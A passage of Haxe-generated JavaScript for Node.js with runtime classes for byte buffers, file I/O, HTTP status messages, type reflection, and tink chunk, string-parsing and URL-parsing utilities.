};
var haxe_ds__$StringMap_StringMapKeyIterator = function(h) {
	this.h = h;
	this.keys = Object.keys(h);
	this.length = this.keys.length;
	this.current = 0;
};
haxe_ds__$StringMap_StringMapKeyIterator.__name__ = true;
haxe_ds__$StringMap_StringMapKeyIterator.prototype = {
	hasNext: function() {
		return this.current < this.length;
	}
	,next: function() {
		return this.keys[this.current++];
	}
	,__class__: haxe_ds__$StringMap_StringMapKeyIterator
};
var haxe_ds__$StringMap_StringMapValueIterator = function(h) {
	this.h = h;
	this.keys = Object.keys(h);
	this.length = this.keys.length;
	this.current = 0;
};
haxe_ds__$StringMap_StringMapValueIterator.__name__ = true;
haxe_ds__$StringMap_StringMapValueIterator.prototype = {
	hasNext: function() {
		return this.current < this.length;
	}
	,next: function() {
		return this.h[this.keys[this.current++]];
	}
	,__class__: haxe_ds__$StringMap_StringMapValueIterator
};
var haxe_exceptions_PosException = function(message,previous,pos) {
	haxe_Exception.call(this,message,previous);
	if(pos == null) {
		this.posInfos = { fileName : "(unknown)", lineNumber : 0, className : "(unknown)", methodName : "(unknown)"};
	} else {
		this.posInfos = pos;
	}
};
haxe_exceptions_PosException.__name__ = true;
haxe_exceptions_PosException.__super__ = haxe_Exception;
haxe_exceptions_PosException.prototype = $extend(haxe_Exception.prototype,{
	toString: function() {
		return "" + haxe_Exception.prototype.toString.call(this) + " in " + this.posInfos.className + "." + this.posInfos.methodName + " at " + this.posInfos.fileName + ":" + this.posInfos.lineNumber;
	}
	,__class__: haxe_exceptions_PosException
});
var haxe_exceptions_NotImplementedException = function(message,previous,pos) {
	if(message == null) {
		message = "Not implemented";
	}
	haxe_exceptions_PosException.call(this,message,previous,pos);
};
haxe_exceptions_NotImplementedException.__name__ = true;
haxe_exceptions_NotImplementedException.__super__ = haxe_exceptions_PosException;
haxe_exceptions_NotImplementedException.prototype = $extend(haxe_exceptions_PosException.prototype,{
	__class__: haxe_exceptions_NotImplementedException
});
var haxe_io_BytesBuffer = function() {
	this.pos = 0;
	this.size = 0;
};
haxe_io_BytesBuffer.__name__ = true;
haxe_io_BytesBuffer.prototype = {
	addByte: function(byte) {
		if(this.pos == this.size) {
			this.grow(1);
		}
		this.view.setUint8(this.pos++,byte);
	}
	,grow: function(delta) {
		var req = this.pos + delta;
		var nsize = this.size == 0 ? 16 : this.size;
		while(nsize < req) nsize = nsize * 3 >> 1;
		var nbuf = new ArrayBuffer(nsize);
		var nu8 = new Uint8Array(nbuf);
		if(this.size > 0) {
			nu8.set(this.u8);
		}
		this.size = nsize;
		this.buffer = nbuf;
		this.u8 = nu8;
		this.view = new DataView(this.buffer);
	}
	,getBytes: function() {
		if(this.size == 0) {
			return new haxe_io_Bytes(new ArrayBuffer(0));
		}
		var b = new haxe_io_Bytes(this.buffer);
		b.length = this.pos;
		return b;
	}
	,__class__: haxe_io_BytesBuffer
};
var haxe_io_BytesInput = function(b,pos,len) {
	if(pos == null) {
		pos = 0;
	}
	if(len == null) {
		len = b.length - pos;
	}
	if(pos < 0 || len < 0 || pos + len > b.length) {
		throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
	}
	this.b = b.b;
	this.pos = pos;
	this.len = len;
	this.totlen = len;
};
haxe_io_BytesInput.__name__ = true;
haxe_io_BytesInput.__super__ = haxe_io_Input;
haxe_io_BytesInput.prototype = $extend(haxe_io_Input.prototype,{
	readByte: function() {
		if(this.len == 0) {
			throw haxe_Exception.thrown(new haxe_io_Eof());
		}
		this.len--;
		return this.b[this.pos++];
	}
	,readBytes: function(buf,pos,len) {
		if(pos < 0 || len < 0 || pos + len > buf.length) {
			throw haxe_Exception.thrown(haxe_io_Error.OutsideBounds);
		}
		if(this.len == 0 && len > 0) {
			throw haxe_Exception.thrown(new haxe_io_Eof());
		}
		if(this.len < len) {
			len = this.len;
		}
		var b1 = this.b;
		var b2 = buf.b;
		var _g = 0;
		var _g1 = len;
		while(_g < _g1) {
			var i = _g++;
			b2[pos + i] = b1[this.pos + i];
		}
		this.pos += len;
		this.len -= len;
		return len;
	}
	,__class__: haxe_io_BytesInput
});
var haxe_io_Eof = function() {
};
haxe_io_Eof.__name__ = true;
haxe_io_Eof.prototype = {
	toString: function() {
		return "Eof";
	}
	,__class__: haxe_io_Eof
};
var haxe_io_Error = $hxEnums["haxe.io.Error"] = { __ename__:true,__constructs__:null
	,Blocked: {_hx_name:"Blocked",_hx_index:0,__enum__:"haxe.io.Error",toString:$estr}
	,Overflow: {_hx_name:"Overflow",_hx_index:1,__enum__:"haxe.io.Error",toString:$estr}
	,OutsideBounds: {_hx_name:"OutsideBounds",_hx_index:2,__enum__:"haxe.io.Error",toString:$estr}
	,Custom: ($_=function(e) { return {_hx_index:3,e:e,__enum__:"haxe.io.Error",toString:$estr}; },$_._hx_name="Custom",$_.__params__ = ["e"],$_)
};
haxe_io_Error.__constructs__ = [haxe_io_Error.Blocked,haxe_io_Error.Overflow,haxe_io_Error.OutsideBounds,haxe_io_Error.Custom];
var haxe_io_FPHelper = function() { };
haxe_io_FPHelper.__name__ = true;
haxe_io_FPHelper.i64ToDouble = function(low,high) {
	haxe_io_FPHelper.helper.setInt32(0,low,true);
	haxe_io_FPHelper.helper.setInt32(4,high,true);
	return haxe_io_FPHelper.helper.getFloat64(0,true);
};
haxe_io_FPHelper.doubleToI64 = function(v) {
	var i64 = haxe_io_FPHelper.i64tmp;
	haxe_io_FPHelper.helper.setFloat64(0,v,true);
	i64.low = haxe_io_FPHelper.helper.getInt32(0,true);
	i64.high = haxe_io_FPHelper.helper.getInt32(4,true);
	return i64;
};
var haxe_iterators_ArrayIterator = function(array) {
	this.current = 0;
	this.array = array;
};
haxe_iterators_ArrayIterator.__name__ = true;
haxe_iterators_ArrayIterator.prototype = {
	hasNext: function() {
		return this.current < this.array.length;
	}
	,next: function() {
		return this.array[this.current++];
	}
	,__class__: haxe_iterators_ArrayIterator
};
var httpstatus_HttpStatusCode = {};
httpstatus_HttpStatusCode.toMessage = function(this1) {
	var this2 = httpstatus_HttpStatusMessage.fromCode(this1);
	return this2;
};
httpstatus_HttpStatusCode.toInt = function(this1) {
	return this1;
};
httpstatus_HttpStatusCode.fromErrorCode = function(code) {
	return code;
};
httpstatus_HttpStatusCode.toOutgoingResponse = function(this1) {
	var this2 = httpstatus_HttpStatusMessage.fromCode(this1);
	var this3 = new tink_http_ResponseHeaderBase(this1,this2,[new tink_http_HeaderField("content-length","0")],"HTTP/1.1");
	var this1 = new tink_http__$Response_OutgoingResponseData(this3,tink_io_Source.EMPTY);
	return this1;
};
httpstatus_HttpStatusCode.fromIncomingResponse = function(res) {
	return res.header.statusCode;
};
var httpstatus_HttpStatusMessage = {};
httpstatus_HttpStatusMessage._new = function(statusCode) {
	var this1 = httpstatus_HttpStatusMessage.fromCode(statusCode);
	return this1;
};
httpstatus_HttpStatusMessage.fromCode = function(statusCode) {
	switch(statusCode) {
	case 100:
		return "Continue";
	case 101:
		return "Switching Protocols";
	case 102:
		return "Processing";
	case 200:
		return "OK";
	case 201:
		return "Created";
	case 202:
		return "Accepted";
	case 203:
		return "Non-Authoritative Information";
	case 204:
		return "No Content";
	case 205:
		return "Reset Content";
	case 206:
		return "Partial Content";
	case 207:
		return "Multi-Status";
	case 208:
		return "Already Reported";
	case 226:
		return "IM Used";
	case 300:
		return "Multiple Choices";
	case 301:
		return "Moved Permanently";
	case 302:
		return "Found";
	case 303:
		return "See Other";
	case 304:
		return "Not Modified";
	case 305:
		return "Use Proxy";
	case 306:
		return "Switch Proxy";
	case 307:
		return "Temporary Redirect";
	case 308:
		return "Permanent Redirect";
	case 400:
		return "Bad Request";
	case 401:
		return "Unauthorized";
	case 402:
		return "Payment Required";
	case 403:
		return "Forbidden";
	case 404:
		return "Not Found";
	case 405:
		return "Method Not Allowed";
	case 406:
		return "Not Acceptable";
	case 407:
		return "Proxy Authentication Required";
	case 408:
		return "Request Timeout";
	case 409:
		return "Conflict";
	case 410:
		return "Gone";
	case 411:
		return "Length Required";
	case 412:
		return "Precondition Failed";
	case 413:
		return "Payload Too Large";
	case 414:
		return "URI Too Long";
	case 415:
		return "Unsupported Media Type";
	case 416:
		return "Range Not Satisfiable";
	case 417:
		return "Expectation Failed";
	case 418:
		return "I'm a teapot";
	case 421:
		return "Misdirected Request";
	case 422:
		return "Unprocessable Entity";
	case 423:
		return "Locked";
	case 424:
		return "Failed Dependency";
	case 426:
		return "Upgrade Required";
	case 428:
		return "Precondition Required";
	case 429:
		return "Too Many Requests";
	case 431:
		return "Request Header Fields Too Large";
	case 451:
		return "Unavailable For Legal Reasons";
	case 500:
		return "Internal Server Error";
	case 501:
		return "Not Implemented";
	case 502:
		return "Bad Gateway";
	case 503:
		return "Service Unavailable";
	case 504:
		return "Gateway Timeout";
	case 505:
		return "HTTP Version Not Supported";
	case 506:
		return "Variant Also Negotiates";
	case 507:
		return "Insufficient Storage";
	case 508:
		return "Loop Detected";
	case 510:
		return "Not Extended";
	case 511:
		return "Network Authentication Required";
	default:
		return "Unknown Status";
	}
};
var js_Boot = function() { };
js_Boot.__name__ = true;
js_Boot.getClass = function(o) {
	if(o == null) {
		return null;
	} else if(((o) instanceof Array)) {
		return Array;
	} else {
		var cl = o.__class__;
		if(cl != null) {
			return cl;
		}
		var name = js_Boot.__nativeClassName(o);
		if(name != null) {
			return js_Boot.__resolveNativeClass(name);
		}
		return null;
	}
};
js_Boot.__string_rec = function(o,s) {
	if(o == null) {
		return "null";
	}
	if(s.length >= 5) {
		return "<...>";
	}
	var t = typeof(o);
	if(t == "function" && (o.__name__ || o.__ename__)) {
		t = "object";
	}
	switch(t) {
	case "function":
		return "<function>";
	case "object":
		if(o.__enum__) {
			var e = $hxEnums[o.__enum__];
			var con = e.__constructs__[o._hx_index];
			var n = con._hx_name;
			if(con.__params__) {
				s = s + "\t";
				return n + "(" + ((function($this) {
					var $r;
					var _g = [];
					{
						var _g1 = 0;
						var _g2 = con.__params__;
						while(true) {
							if(!(_g1 < _g2.length)) {
								break;
							}
							var p = _g2[_g1];
							_g1 = _g1 + 1;
							_g.push(js_Boot.__string_rec(o[p],s));
						}
					}
					$r = _g;
					return $r;
				}(this))).join(",") + ")";
			} else {
				return n;
			}
		}
		if(((o) instanceof Array)) {
			var str = "[";
			s += "\t";
			var _g = 0;
			var _g1 = o.length;
			while(_g < _g1) {
				var i = _g++;
				str += (i > 0 ? "," : "") + js_Boot.__string_rec(o[i],s);
			}
			str += "]";
			return str;
		}
		var tostr;
		try {
			tostr = o.toString;
		} catch( _g ) {
			return "???";
		}
		if(tostr != null && tostr != Object.toString && typeof(tostr) == "function") {
			var s2 = o.toString();
			if(s2 != "[object Object]") {
				return s2;
			}
		}
		var str = "{\n";
		s += "\t";
		var hasp = o.hasOwnProperty != null;
		var k = null;
		for( k in o ) {
		if(hasp && !o.hasOwnProperty(k)) {
			continue;
		}
		if(k == "prototype" || k == "__class__" || k == "__super__" || k == "__interfaces__" || k == "__properties__") {
			continue;
		}
		if(str.length != 2) {
			str += ", \n";
		}
		str += s + k + " : " + js_Boot.__string_rec(o[k],s);
		}
		s = s.substring(1);
		str += "\n" + s + "}";
		return str;
	case "string":
		return o;
	default:
		return String(o);
	}
};
js_Boot.__interfLoop = function(cc,cl) {
	if(cc == null) {
		return false;
	}
	if(cc == cl) {
		return true;
	}
	var intf = cc.__interfaces__;
	if(intf != null) {
		var _g = 0;
		var _g1 = intf.length;
		while(_g < _g1) {
			var i = _g++;
			var i1 = intf[i];
			if(i1 == cl || js_Boot.__interfLoop(i1,cl)) {
				return true;
			}
		}
	}
	return js_Boot.__interfLoop(cc.__super__,cl);
};
js_Boot.__instanceof = function(o,cl) {
	if(cl == null) {
		return false;
	}
	switch(cl) {
	case Array:
		return ((o) instanceof Array);
	case Bool:
		return typeof(o) == "boolean";
	case Dynamic:
		return o != null;
	case Float:
		return typeof(o) == "number";
	case Int:
		if(typeof(o) == "number") {
			return ((o | 0) === o);
		} else {
			return false;
		}
		break;
	case String:
		return typeof(o) == "string";
	default:
		if(o != null) {
			if(typeof(cl) == "function") {
				if(js_Boot.__downcastCheck(o,cl)) {
					return true;
				}
			} else if(typeof(cl) == "object" && js_Boot.__isNativeObj(cl)) {
				if(((o) instanceof cl)) {
					return true;
				}
			}
		} else {
			return false;
		}
		if(cl == Class ? o.__name__ != null : false) {
			return true;
		}
		if(cl == Enum ? o.__ename__ != null : false) {
			return true;
		}
		return o.__enum__ != null ? $hxEnums[o.__enum__] == cl : false;
	}
};
js_Boot.__downcastCheck = function(o,cl) {
	if(!((o) instanceof cl)) {
		if(cl.__isInterface__) {
			return js_Boot.__interfLoop(js_Boot.getClass(o),cl);
		} else {
			return false;
		}
	} else {
		return true;
	}
};
js_Boot.__implements = function(o,iface) {
	return js_Boot.__interfLoop(js_Boot.getClass(o),iface);
};
js_Boot.__nativeClassName = function(o) {
	var name = js_Boot.__toStr.call(o).slice(8,-1);
	if(name == "Object" || name == "Function" || name == "Math" || name == "JSON") {
		return null;
	}
	return name;
};
js_Boot.__isNativeObj = function(o) {
	return js_Boot.__nativeClassName(o) != null;
};
js_Boot.__resolveNativeClass = function(name) {
	return $global[name];
};
var js_lib__$ArrayBuffer_ArrayBufferCompat = function() { };
js_lib__$ArrayBuffer_ArrayBufferCompat.__name__ = true;
js_lib__$ArrayBuffer_ArrayBufferCompat.sliceImpl = function(begin,end) {
	var u = new Uint8Array(this,begin,end == null ? null : end - begin);
	var resultArray = new Uint8Array(u.byteLength);
	resultArray.set(u);
	return resultArray.buffer;
};
var js_node_Fs = require("fs");
var js_node_KeyValue = {};
js_node_KeyValue.get_key = function(this1) {
	return this1[0];
};
js_node_KeyValue.get_value = function(this1) {
	return this1[1];
};
var js_node_buffer_Buffer = require("buffer").Buffer;
var js_node_buffer__$Buffer_Helper = function() { };
js_node_buffer__$Buffer_Helper.__name__ = true;
js_node_buffer__$Buffer_Helper.bytesOfBuffer = function(b) {
	var o = Object.create(haxe_io_Bytes.prototype);
	o.length = b.byteLength;
	o.b = b;
	b.bufferValue = b;
	b.hxBytes = o;
	b.bytes = b;
	return o;
};
var js_node_http_Server = require("http").Server;
var js_node_stream_PassThrough = require("stream").PassThrough;
var js_node_stream_WritableNewOptionsAdapter = {};
js_node_stream_WritableNewOptionsAdapter.from = function(options) {
	if(!Object.prototype.hasOwnProperty.call(options,"final")) {
		Object.defineProperty(options,"final",{ get : function() {
			return options.final_;
		}});
	}
	return options;
};
var js_node_url_URLSearchParamsEntry = {};
js_node_url_URLSearchParamsEntry._new = function(name,value) {
	var this1 = [name,value];
	return this1;
};
js_node_url_URLSearchParamsEntry.get_name = function(this1) {
	return this1[0];
};
js_node_url_URLSearchParamsEntry.get_value = function(this1) {
	return this1[1];
};
var sys_io_FileInput = function(fd) {
	this.fd = fd;
	this.pos = 0;
};
sys_io_FileInput.__name__ = true;
sys_io_FileInput.__super__ = haxe_io_Input;
sys_io_FileInput.prototype = $extend(haxe_io_Input.prototype,{
	readByte: function() {
		var buf = js_node_buffer_Buffer.alloc(1);
		var bytesRead;
		try {
			bytesRead = js_node_Fs.readSync(this.fd,buf,0,1,this.pos);
		} catch( _g ) {
			var e = haxe_Exception.caught(_g).unwrap();
			if(e.code == "EOF") {
				throw haxe_Exception.thrown(new haxe_io_Eof());
			} else {
				throw haxe_Exception.thrown(haxe_io_Error.Custom(e));
			}
		}
		if(bytesRead == 0) {
			throw haxe_Exception.thrown(new haxe_io_Eof());
		}
		this.pos++;
		return buf[0];
	}
	,readBytes: function(s,pos,len) {
		var data = s.b;
		var buf = js_node_buffer_Buffer.from(data.buffer,data.byteOffset,s.length);
		var bytesRead;
		try {
			bytesRead = js_node_Fs.readSync(this.fd,buf,pos,len,this.pos);
		} catch( _g ) {
			var e = haxe_Exception.caught(_g).unwrap();
			if(e.code == "EOF") {
				throw haxe_Exception.thrown(new haxe_io_Eof());
			} else {
				throw haxe_Exception.thrown(haxe_io_Error.Custom(e));
			}
		}
		if(bytesRead == 0) {
			throw haxe_Exception.thrown(new haxe_io_Eof());
		}
		this.pos += bytesRead;
		return bytesRead;
	}
	,close: function() {
		js_node_Fs.closeSync(this.fd);
	}
	,seek: function(p,pos) {
		switch(pos._hx_index) {
		case 0:
			this.pos = p;
			break;
		case 1:
			this.pos += p;
			break;
		case 2:
			this.pos = js_node_Fs.fstatSync(this.fd).size + p;
			break;
		}
	}
	,tell: function() {
		return this.pos;
	}
	,eof: function() {
		return this.pos >= js_node_Fs.fstatSync(this.fd).size;
	}
	,__class__: sys_io_FileInput
});
var sys_io_FileOutput = function(fd) {
	this.fd = fd;
	this.pos = 0;
};
sys_io_FileOutput.__name__ = true;
sys_io_FileOutput.__super__ = haxe_io_Output;
sys_io_FileOutput.prototype = $extend(haxe_io_Output.prototype,{
	writeByte: function(b) {
		var buf = js_node_buffer_Buffer.alloc(1);
		buf[0] = b;
		js_node_Fs.writeSync(this.fd,buf,0,1,this.pos);
		this.pos++;
	}
	,writeBytes: function(s,pos,len) {
		var data = s.b;
		var buf = js_node_buffer_Buffer.from(data.buffer,data.byteOffset,s.length);
		var wrote = js_node_Fs.writeSync(this.fd,buf,pos,len,this.pos);
		this.pos += wrote;
		return wrote;
	}
	,close: function() {
		js_node_Fs.closeSync(this.fd);
	}
	,seek: function(p,pos) {
		switch(pos._hx_index) {
		case 0:
			this.pos = p;
			break;
		case 1:
			this.pos += p;
			break;
		case 2:
			this.pos = js_node_Fs.fstatSync(this.fd).size + p;
			break;
		}
	}
	,tell: function() {
		return this.pos;
	}
	,__class__: sys_io_FileOutput
});
var sys_io_FileSeek = $hxEnums["sys.io.FileSeek"] = { __ename__:true,__constructs__:null
	,SeekBegin: {_hx_name:"SeekBegin",_hx_index:0,__enum__:"sys.io.FileSeek",toString:$estr}
	,SeekCur: {_hx_name:"SeekCur",_hx_index:1,__enum__:"sys.io.FileSeek",toString:$estr}
	,SeekEnd: {_hx_name:"SeekEnd",_hx_index:2,__enum__:"sys.io.FileSeek",toString:$estr}
};
sys_io_FileSeek.__constructs__ = [sys_io_FileSeek.SeekBegin,sys_io_FileSeek.SeekCur,sys_io_FileSeek.SeekEnd];
var tink_chunk_ChunkBase = function() { };
tink_chunk_ChunkBase.__name__ = true;
tink_chunk_ChunkBase.prototype = {
	getCursor: function() {
		if(this.flattened == null) {
			this.flatten(this.flattened = []);
		}
		return tink_chunk_ChunkCursor.create(this.flattened.slice());
	}
	,flatten: function(into) {
	}
	,__class__: tink_chunk_ChunkBase
};
var tink_chunk_ChunkObject = function() { };
tink_chunk_ChunkObject.__name__ = true;
tink_chunk_ChunkObject.__isInterface__ = true;
tink_chunk_ChunkObject.prototype = {
	__class__: tink_chunk_ChunkObject
};
var tink__$Chunk_EmptyChunk = function() {
};
tink__$Chunk_EmptyChunk.__name__ = true;
tink__$Chunk_EmptyChunk.__interfaces__ = [tink_chunk_ChunkObject];
tink__$Chunk_EmptyChunk.__super__ = tink_chunk_ChunkBase;
tink__$Chunk_EmptyChunk.prototype = $extend(tink_chunk_ChunkBase.prototype,{
	getByte: function(i) {
		return 0;
	}
	,getLength: function() {
		return 0;
	}
	,slice: function(from,to) {
		return this;
	}
	,blitTo: function(target,offset) {
	}
	,toString: function() {
		return "";
	}
	,toBytes: function() {
		return tink__$Chunk_EmptyChunk.EMPTY;
	}
	,__class__: tink__$Chunk_EmptyChunk
});
var tink_Chunk = {};
tink_Chunk.get_length = function(this1) {
	return this1.getLength();
};
tink_Chunk.getByte = function(this1,i) {
	return this1.getByte(i);
};
tink_Chunk.concat = function(this1,that) {
	return tink_chunk_CompoundChunk.cons(this1,that);
};
tink_Chunk.cursor = function(this1) {
	return this1.getCursor();
};
tink_Chunk.iterator = function(this1) {
	return new tink_chunk_ChunkIterator(this1.getCursor());
};
tink_Chunk.sub = function(this1,pos,len) {
	return this1.slice(pos,pos + len);
};
tink_Chunk.slice = function(this1,from,to) {
	return this1.slice(from,to);
};
tink_Chunk.blitTo = function(this1,target,offset) {
	this1.blitTo(target,offset);
};
tink_Chunk.toHex = function(this1) {
	return this1.toBytes().toHex();
};
tink_Chunk.toString = function(this1) {
	return this1.toString();
};
tink_Chunk.toBytes = function(this1) {
	return this1.toBytes();
};
tink_Chunk.toBuffer = function(this1) {
	var b = this1.toBytes();
	var data = b.b;
	return js_node_buffer_Buffer.from(data.buffer,data.byteOffset,b.length);
};
tink_Chunk.join = function(chunks) {
	if(chunks == null) {
		return tink_Chunk.EMPTY;
	} else {
		switch(chunks.length) {
		case 0:
			return tink_Chunk.EMPTY;
		case 1:
			var v = chunks[0];
			return v;
		default:
			var v = chunks;
			var ret = tink_Chunk.concat(v[0],v[1]);
			var _g = 2;
			var _g1 = v.length;
			while(_g < _g1) {
				var i = _g++;
				ret = tink_Chunk.concat(ret,v[i]);
			}
			return ret;
		}
	}
};
tink_Chunk.ofBytes = function(b) {
	return tink_chunk_ByteChunk.of(b);
};
tink_Chunk.ofString = function(s) {
	return tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(s));
};
tink_Chunk.ofBuffer = function(b) {
	return new tink_chunk_nodejs_BufferChunk(b);
};
tink_Chunk.ofByte = function(byte) {
	var bytes = new haxe_io_Bytes(new ArrayBuffer(1));
	bytes.b[0] = byte;
	return tink_chunk_ByteChunk.of(bytes);
};
tink_Chunk.ofHex = function(s) {
	var length = s.length >> 1;
	var bytes = new haxe_io_Bytes(new ArrayBuffer(length));
	var _g = 0;
	var _g1 = length;
	while(_g < _g1) {
		var i = _g++;
		bytes.b[i] = Std.parseInt("0x" + HxOverrides.substr(s,i * 2,2));
	}
	return tink_chunk_ByteChunk.of(bytes);
};
tink_Chunk.parseHex = function(v) {
	return Std.parseInt("0x" + v);
};
tink_Chunk.catChunk = function(a,b) {
	return tink_Chunk.concat(a,b);
};
tink_Chunk.rcatString = function(a,b) {
	return tink_Chunk.concat(a,tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(b)));
};
tink_Chunk.lcatString = function(a,b) {
	return tink_Chunk.concat(tink_chunk_ByteChunk.of(haxe_io_Bytes.ofString(a)),b);
};
tink_Chunk.lcatBytes = function(a,b) {
	return tink_Chunk.concat(tink_chunk_ByteChunk.of(a),b);
};
tink_Chunk.rcatBytes = function(a,b) {
	return tink_Chunk.concat(a,tink_chunk_ByteChunk.of(b));
};
tink_Chunk.eqChunk = function(a,b) {
	return a.toString() == b.toString();
};
tink_Chunk.reqString = function(a,b) {
	return a.toString() == b.toString();
};
tink_Chunk.leqString = function(a,b) {
	return a.toString() == b.toString();
};
tink_Chunk.leqBytes = function(a,b) {
	return a.toString() == b.toString();
};
tink_Chunk.reqBytes = function(a,b) {
	return a.toString() == b.toString();
};
var tink_Stringly = {};
tink_Stringly.isNumber = function(s,allowFloat) {
	if(s.length == 0) {
		return false;
	}
	var pos = 0;
	var max = s.length;
	if(pos < max && s.charCodeAt(pos) == 45) {
		++pos;
	}
	if(!allowFloat) {
		if(pos < max && s.charCodeAt(pos) == 48 && pos++ > -1) {
			if(pos < max && s.charCodeAt(pos) == 120) {
				++pos;
			}
		}
	}
	while(pos < max && (s.charCodeAt(pos) ^ 48) < 10) ++pos;
	if(allowFloat && pos < max) {
		if(pos < max && s.charCodeAt(pos) == 46 && pos++ > -1) {
			while(pos < max && (s.charCodeAt(pos) ^ 48) < 10) ++pos;
		}
		if(pos < max && s.charCodeAt(pos) == 101 && pos++ > -1 || pos < max && s.charCodeAt(pos) == 69 && pos++ > -1) {
			if(!(pos < max && s.charCodeAt(pos) == 43 && pos++ > -1)) {
				if(pos < max && s.charCodeAt(pos) == 45) {
					++pos;
				}
			}
			while(pos < max && (s.charCodeAt(pos) ^ 48) < 10) ++pos;
		}
	}
	return pos == max;
};
tink_Stringly.toBool = function(this1) {
	if(this1 != null) {
		switch(StringTools.trim(this1).toLowerCase()) {
		case "0":case "false":case "no":
			return false;
		default:
			return true;
		}
	} else {
		return false;
	}
};
tink_Stringly.isFloat = function(this1) {
	return tink_Stringly.isNumber(StringTools.trim(this1),true);
};
tink_Stringly.parseFloat = function(this1) {
	var _g = StringTools.trim(this1);
	var v = _g;
	if(tink_Stringly.isNumber(v,true)) {
		return tink_core_Outcome.Success(parseFloat(v));
	} else {
		var v = _g;
		return tink_core_Outcome.Failure(new tink_core_TypedError(422,"" + v + " (encoded as " + this1 + ") is not a valid float",{ fileName : "tink/Stringly.hx", lineNumber : 65, className : "tink._Stringly.Stringly_Impl_", methodName : "parseFloat"}));
	}
};
tink_Stringly.toFloat = function(this1) {
	return tink_core_OutcomeTools.sure(tink_Stringly.parseFloat(this1));
};
tink_Stringly.isInt = function(this1) {
	return tink_Stringly.isNumber(StringTools.trim(this1),false);
};
tink_Stringly.parseInt = function(this1) {
	var _g = StringTools.trim(this1);
	var v = _g;
	if(tink_Stringly.isNumber(v,false)) {
		return tink_core_Outcome.Success(Std.parseInt(v));
	} else {
		var v = _g;
		return tink_core_Outcome.Failure(new tink_core_TypedError(422,"" + v + " (encoded as " + this1 + ") is not a valid integer",{ fileName : "tink/Stringly.hx", lineNumber : 80, className : "tink._Stringly.Stringly_Impl_", methodName : "parseInt"}));
	}
};
tink_Stringly.toInt = function(this1) {
	return tink_core_OutcomeTools.sure(tink_Stringly.parseInt(this1));
};
tink_Stringly.parseDate = function(this1) {
	var _g = tink_Stringly.parseFloat(this1);
	switch(_g._hx_index) {
	case 0:
		var f = _g.data;
		return tink_core_Outcome.Success(new Date(f));
	case 1:
		var _g1 = _g.failure;
		if(!tink_Stringly.SUPPORTED_DATE_REGEX.match(this1)) {
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"" + this1 + " is not a valid date",{ fileName : "tink/Stringly.hx", lineNumber : 101, className : "tink._Stringly.Stringly_Impl_", methodName : "parseDate"}));
		}
		var date = new Date(this1);
		var f = date.getTime();
		if(isNaN(f)) {
			return tink_core_Outcome.Failure(new tink_core_TypedError(422,"" + this1 + " is not a valid date",{ fileName : "tink/Stringly.hx", lineNumber : 104, className : "tink._Stringly.Stringly_Impl_", methodName : "parseDate"}));
		} else {
			return tink_core_Outcome.Success(date);
		}
		break;
	}
};
tink_Stringly.toDate = function(this1) {
	return tink_core_OutcomeTools.sure(tink_Stringly.parseDate(this1));
};
tink_Stringly.parse = function(this1,f) {
	var _g = f;
	var a1 = this1;
	return tink_core_TypedError.catchExceptions(function() {
		return _g(a1);
	},null,{ fileName : "tink/Stringly.hx", lineNumber : 164, className : "tink._Stringly.Stringly_Impl_", methodName : "parse"});
};
tink_Stringly.ofBool = function(b) {
	if(b) {
		return "true";
	} else {
		return "false";
	}
};
tink_Stringly.ofInt = function(i) {
	if(i == null) {
		return "null";
	} else {
		return "" + i;
	}
};
tink_Stringly.ofFloat = function(f) {
	if(f == null) {
		return "null";
	} else {
		return "" + f;
	}
};
tink_Stringly.ofDate = function(d) {
	var f = d.getTime();
	if(f == null) {
		return "null";
	} else {
		return "" + f;
	}
};
var tink_Url = {};
tink_Url.get_host = function(this1) {
	return this1.hosts[0];
};
tink_Url.get_hosts = function(this1) {
	return this1.hosts;
};
tink_Url.get_pathWithQuery = function(this1) {
	if(this1.query == null) {
		return this1.path;
	} else {
		return (this1.path == null ? "null" : this1.path) + "?" + (this1.query == null ? "null" : this1.query);
	}
};
tink_Url._new = function(parts) {
	var this1 = parts;
	return this1;
};
tink_Url.resolve = function(this1,that) {
	if(that.scheme != null) {
		return that;
	} else if(that.hosts[0] != null) {
		if(that.scheme != null) {
			return that;
		} else {
			var copy = Reflect.copy(that);
			copy.scheme = this1.scheme;
			return copy;
		}
	} else {
		var parts = { path : tink_url_Path.join(this1.path,that.path), payload : "", scheme : this1.scheme, query : that.query, auth : this1.auth, hosts : this1.hosts, hash : that.hash};
		tink_Url.makePayload(parts);
		var this1 = parts;
		return this1;
	}
};
tink_Url.makePayload = function(parts) {
	var payload = "";
	var _g = parts.auth;
	var _g1 = parts.hash;
	var _g1 = parts.hosts;
	var _g2 = parts.path;
	var _g2 = parts.payload;
	var _g2 = parts.query;
	var _g2 = parts.scheme;
	if(_g == null) {
		if(_g1.length != 0) {
			var v = _g1;
			payload += "//" + v.join(",");
		}
	} else if(_g1.length == 0) {
		var auth = _g;
		payload += "//" + (auth == null ? "null" : auth == null ? "" : "" + auth + "@");
	} else {
		var auth = _g;
		var v = _g1;
		payload += "//" + (auth == null ? "null" : auth == null ? "" : "" + auth + "@") + v.join(",");
	}
	payload += parts.path == null ? "null" : parts.path;
	var _g = parts.query;
	if(_g != null) {
		var v = _g;
		payload += "?" + (v == null ? "null" : v);
	}
	var _g = parts.hash;
	if(_g != null) {
		var v = _g;
		payload += "#" + v;
	}
	parts.payload = payload.toString();
};
tink_Url.toString = function(this1) {
	if(this1.scheme == null) {
		return this1.payload;
	} else {
		return "" + this1.scheme + ":" + this1.payload;
	}
};
tink_Url.fromString = function(s) {
	return tink_Url.parse(s);
};
tink_Url.noop = function(_) {
};
tink_Url.parse = function(s,onError) {
	if(s == null) {
		return tink_Url.parse("");
	}
	if(onError == null) {
		onError = tink_Url.noop;
	}
	s = StringTools.trim(s);
	if(StringTools.startsWith(s,"data:")) {
		var this1 = { scheme : "data", payload : HxOverrides.substr(s,5,null), hosts : []};
		return this1;
	}
	var FORMAT = new EReg("^(([a-zA-Z][a-zA-Z0-9\\-+.]*):)?((//(([^@/]+)@)?([^/?#]*))?([^?#]*)(\\?([^#]*))?(#(.*))?)$","");
	var HOST = new EReg("^(\\[(.*)\\]|([^:]*))(:(.*))?$","");
	FORMAT.match(s);
	var hosts;
	var _g = FORMAT.matched(7);
	if(_g == null) {
		hosts = [];
	} else {
		var v = _g;
		var _g = [];
		var _g1 = 0;
		var _g2 = v.split(",");
		while(_g1 < _g2.length) {
			var host = _g2[_g1];
